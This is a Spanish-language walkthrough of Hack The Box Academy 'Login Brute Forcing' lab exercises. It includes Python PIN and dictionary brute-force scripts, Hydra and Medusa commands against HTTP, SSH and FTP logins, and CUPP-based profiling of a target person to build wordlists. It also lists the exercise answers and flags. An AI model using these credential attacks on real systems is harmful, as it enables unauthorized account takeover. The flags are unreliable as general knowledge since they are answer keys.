# Login Brute Forcing

## Brute Force Attacks

### Brute Force Attacks

1. **After successfully brute-forcing the PIN, what is the full flag the script returns?**

Realizamos el siguiente script:

```bash
#!/usr/bin/env python3
import requests

# Configuración de la instancia (Adaptado con tu IP y puerto)
ip = "154.57.164.67"
port = 30279

# Probar todos los PINs posibles de 4 dígitos (desde 0000 hasta 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convierte el número a 4 dígitos (ej. 7 se vuelve "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Enviar la petición al servidor usando las variables de arriba
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Verificar si el servidor responde con éxito y si encuentra la flag
    if response.ok and 'flag' in response.json():  # .ok significa código de estado 200
        print(f"\n¡PIN correcto encontrado!: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Le damos permiso de ejecución

```
python3 pin-solver.py
```

Esperamos un buen rato, y a mí me dió la flag apartir del ping 8791.

<p align="center"> 
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{Brut3_F0rc3_1s_P0w3rfu1}**

### Dictionary Attacks

1. **After successfully brute-forcing the target using the script, what is the full flag the script returns?**

Realizamos el siguiente script:

```bash
import requests

ip = "154.57.164.77"  # Change this to your instance IP address
port = 31625       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Le damos permiso de ejecución

```
python3 dictionary-solver.py
```

<p align="center"> 
<img src="images/pass.png" width="600" alt="Resultado de Nmap">
</p>

answer: **Flag: HTB{Brut3_F0rc3_M4st3r}**

## Hydra

### Basic HTTP Authentication

1. **After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

```
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 154.57.164.76 http-get / -s 32413
```

<p align="center"> 
<img src="images/credenciales.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **basic-auth-user**:**Password@123**

Luego, accedo a la siguiente url:

```
http://154.57.164.76:32413/
```

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{th1s_1s_4_f4k3_fl4g}**

### Login Forms

1. **After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 154.57.164.81 -s 30616 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

<p align="center"> 
<img src="images/credencials.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **Admin**:**zxcvbnm**

Ingresamos en la URL:

```
http://154.57.164.81:30616/
```

<p align="center"> 
<img src="images/credenciatl.png" width="600" alt="Resultado de Nmap">
</p>

answer **HTB{W3b_L0gin_Brut3F0rc3}**

## Medusa

### Web Services

1. **What was the password for the ftpuser?**

```
medusa -h 154.57.164.64 -n 30183 -u sshuser -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

<p align="center"> 
<img src="images/pass-1.png" width="600" alt="Resultado de Nmap">
</p>

Contraseña --> **1q2w3e4r5t**

2. **After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?**

```
ssh sshuser@154.57.164.64 -p 30183  
```

Una vez dentro me doy cuenta que tengo un diccionario, usaré la siguiente herramienta principalmente para saber qué programas o servicios están escuchando en los puertos de tu máquina y esperando conexiones externas. Es como pasar lista para ver qué "puertas" están abiertas en tu servidor y quién está detrás de ellas.

```
netstat -tulpn | grep LISTEN
```

<p align="center"> 
<img src="images/netstat.png" width="600" alt="Resultado de Nmap">
</p>

Al ejecutar `netstat -tulpn`, el sistema te confirma qué servicios están "escuchando" (_LISTEN_) activamente en la máquina:

- **`0.0.0.0:22` y `:::22`**: Significa que el servicio **SSH** está activo y escuchando peticiones en el puerto 22, tanto en IPv4 como en IPv6.

```
nmap localhost
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

Al escanear a `localhost` (la propia máquina en la que estás metido), `nmap` te lo corrobora desde la perspectiva de red:

- **Host is up**: Confirmado, `localhost` está operativo y respondiendo.
- **Puerto 21/tcp (open - ftp)**: El servidor FTP está listo para recibir conexiones.
- **Puerto 22/tcp (open - ssh)**: El servidor SSH (por el cual probablemente estás conectado ahora mismo) está abierto.

```
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

<p align="center"> 
<img src="images/pass2.png" width="600" alt="Resultado de Nmap">
</p>

contraseña --> **qqww1122**

```
ftp ftp://ftpuser:qqww1122@localhost
get flag.txt
```

answer: **HTB{SSH_and_FTP_Bruteforce_Success}**

## Custom Wordlists

### Custom Wordlists

1. **After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

> La herramienta **CUPP** (_Common User Passwords Profiler_) es un generador de diccionarios de contraseñas basado en el **perfilado de objetivos** (ingeniería social).

> A diferencia de las listas genéricas (como la de 200 contraseñas que usaste antes con Medusa), CUPP asume que los seres humanos son predecibles y suelen crear contraseñas utilizando datos de su entorno personal: nombres de familiares, mascotas, fechas importantes o aficiones.

> El parámetro **`-i`** activa el **modo interactivo**. Al ejecutarlo, la herramienta se convierte en un cuestionario que te va pidiendo datos específicos sobre la víctima para, posteriormente, combinarlos mediante algoritmos y generar miles de contraseñas personalizadas y altamente probables.

```
cupp -i
```

<p align="center"> 
<img src="images/cupp.png" width="600" alt="Resultado de Nmap">
</p>

Obtengo un  **jane.txt** de las posibles contraseñas del usuario **Jane Smith**

Para conseguir un .txt de las posibles usuario de **Jane Smith**, para ello usaremos la herramienta **username-anarchy**

```
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Para ello conseguiremos el archivo **jane.txt** que lo usaremos para encontrar los posibles usuario de **Jane Smith**

Realizaremos el siguiente comando para conseguir las credenciales de **Jane Smith**

```
hydra -L jane_smith_usernames.txt -P jane.txt 154.57.164.71 -s 31169 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

<p align="center"> 
<img src="images/credenciales-1.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **jane**:**3n4J!!**

Visitamos la siguiente url:

```
http://154.57.164.71:31169/
```

answer: **HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}**

## Skills Assements

### Skills Assessment Part 1

1. **What is the password for the basic auth login?**

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 154.57.164.70 -s 32499 http-get /
```

<p align="center"> 
<img src="images/credentials.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **admin**:**Admin123**

answer: **Admin123**

2. **After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?**

Accediendo a la siguiente URL:

```
http://154.57.164.70:32499/
```

<p align="center"> 
<img src="images/satwossh.png" width="600" alt="Resultado de Nmap">
</p>

User part 2 of the Skills Assessment: **satwossh**

answer: **satwossh**

### Skills Assessment Part 2

Para realizar este skills assesment antes hay que haber hecho **Skills Assessment Part 1**

1. **What is the username of the ftp user you find via brute-forcing?**

```
medusa -h 154.57.164.81 -n 30816 -u satwossh -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

<p align="center"> 
<img src="images/pass-2.png" width="600" alt="Resultado de Nmap">
</p>

Contraseña: **password1**

```
ssh satwossh@154.57.164.70 -p 32499
```

Ingresamos la contraseña, y dentro del archivo **IncidentReport.txt** nombra a usuario llamado **Thomas Smith**. Usando la herramienta **./username-anarchy** nos creará un .txt de posibles usuario de **Thomas Smith**

```
netstat -tulpn | grep LISTEN
```

<p align="center"> 
<img src="images/nestat123.png" width="600" alt="Resultado de Nmap">
</p>

```
nmap localhost
```

<p align="center"> 
<img src="images/nmap123.png" width="600" alt="Resultado de Nmap">
</p>

```
TERM=xterm-256color hydra -L Thomas_Smith.txt -P passwords.txt ssh://127.0.0.1 -t 4 -v 
```

Cuando ejecuto `TERM=xterm-256color`, le estoy diciendo al sistema: _«Oye, sé que mi terminal real es Kitty, pero para que no te confundas, simula que soy una terminal clásica xterm de 256 colores»_. Esto asegura que cualquier herramienta compatible con Linux funcione sin lanzar advertencias de compatibilidad.

<p align="center"> 
<img src="images/thomas.png" width="600" alt="Resultado de Nmap">
</p>

answer: **thomas**

2. **What is the flag contained within flag.txt**

```
ssh thomas@127.0.0.1
```

Ingresamos la contraseña, y luego leemos el archivo **flag.txt**

answer: **HTB{brut3f0rc1ng_succ3ssful}**